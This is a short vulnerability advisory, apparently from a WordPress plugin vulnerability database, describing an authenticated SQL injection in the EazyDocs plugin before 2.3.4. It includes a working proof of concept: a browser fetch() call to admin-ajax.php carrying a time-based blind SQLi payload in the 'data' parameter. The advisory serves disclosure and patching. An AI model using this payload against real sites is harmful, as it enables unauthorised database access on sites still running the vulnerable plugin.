## WordPress Plugin Vulnerabilities

# EazyDocs < 2.3.4 - Subscriber + SQLi

### Description

The plugin does not properly sanitize and escape "data" parameter before using it in an SQL statement via an AJAX action, which could allow any authenticated users, such as subscribers, to perform SQL Injection attacks.

### Proof of Concept

1. Create a document then create some sections in the document
2. Log in as Subscriber
3. Paste the following script in the browser's console, and notice it hangs for 5 seconds, indicating the injection succeeded:
```
await fetch("/wp-admin/admin-ajax.php", {
"credentials": "include",
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"body": "action=eaz\_nestable\_docs&data=%5b%7b%22id%22%3a%2286'and(select\*from(select(sleep(5)))a)%23%22%7d%5d",
"method": "POST",
"mode": "cors"
});
```
